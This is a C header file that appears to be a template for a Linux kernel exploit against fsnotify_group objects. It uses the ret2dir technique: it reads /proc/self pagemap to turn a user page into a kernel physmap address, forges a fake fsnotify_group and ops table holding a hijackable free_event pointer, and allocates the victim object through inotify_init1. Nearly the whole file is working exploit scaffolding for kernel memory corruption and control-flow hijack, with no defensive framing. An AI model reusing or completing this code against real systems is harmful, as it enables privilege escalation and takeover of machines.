#ifndef _FSNOTIFY_GROUP_TMPL_H_
#define _FSNOTIFY_GROUP_TMPL_H_

#include <endian.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <unistd.h>

#include <fcntl.h>
#include <memory.h>
#include <sys/mman.h>

#define KMALLOC_SIZE 256

// for ret2dir
#define PHYS_OFFSET 0xffff880000000000
#define PFN_MIN 0
#define PAGE_SIZE 0x1000
#define USER_ADDR 0x40000000
#define PAGE_SHIFT 12

struct fsnotify_group {
	char hole1[0x8];
	void* ops;
	char hole2[0x80];
	void* overflow_event;
	char hole3[0x30];
};

struct fsnotify_ops {
	void* handle_event;
	void* free_group_priv;
	void* freeing_mark;
	void* free_event;
	void* free_mark;
};

unsigned overwrite_start = 0x8;
unsigned overwrite_end = 0x10;

struct fsnotify_group fake_fsnotify_group;
struct fsnotify_ops fake_fsnotify_ops;

void* victim_obj = (void*)&fake_fsnotify_group;
unsigned victim_obj_size = sizeof(struct fsnotify_group);

uint64_t kaddr = 0;

void do_setup_physmap() {
    void* uaddr = (void*)USER_ADDR;
    void* raddr = NULL;
    void* ret = NULL;
    char file_name[30];
    sprintf(file_name, "/proc/%d/pagemap", getpid());
    int fd = open(file_name, O_RDONLY);
    if (fd < 0) {
        perror("open failed");
        goto err;
    }
    uint64_t v = 0;
    uint64_t pfn = 0;

    munmap(uaddr, PAGE_SIZE);
    raddr = mmap(uaddr, PAGE_SIZE, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANON, -1, 0);
    if(raddr == MAP_FAILED) {
        perror("mmap failed");
        goto err;
    }
    // necessary due to lazy allocation
    memset(raddr, 0, PAGE_SIZE);
    lseek(fd, ((uint64_t)uaddr >> PAGE_SHIFT)*sizeof(uint64_t), SEEK_SET);
    read(fd, &v, sizeof(uint64_t));
    if (v & (1UL << 63)) {
        pfn = v & ((1UL << 55) - 1);
        fprintf(stdout, "pfn: 0x%lx\n", pfn);
        kaddr = PHYS_OFFSET + 0x1000 * (pfn-PFN_MIN);
        fprintf(stdout, "kaddr: 0x%lx\n", kaddr);
        ret = (void*)kaddr;

        memset(&fake_fsnotify_group, 0xff, sizeof(struct fsnotify_group));

        fake_fsnotify_group.ops = (void*)kaddr;

        fake_fsnotify_ops.free_event = (void*)0xffffffffdeadbeef;

        memset((void*)USER_ADDR, 0xff, PAGE_SIZE);
        memcpy((void*)USER_ADDR, &fake_fsnotify_ops, sizeof(struct fsnotify_ops));
    }
    return;
err:
    close(fd);
    exit(-1);

}

uint64_t r[6] = {0xffffffffffffffff, 0x0, 0x0, 0x0, 0xffffffffffffffff, 0x0};

void do_alloc_victim() {
	long res = 0;
	res = syscall(__NR_inotify_init1, 0x800);
}

void do_hijack() {
	
}

#endif
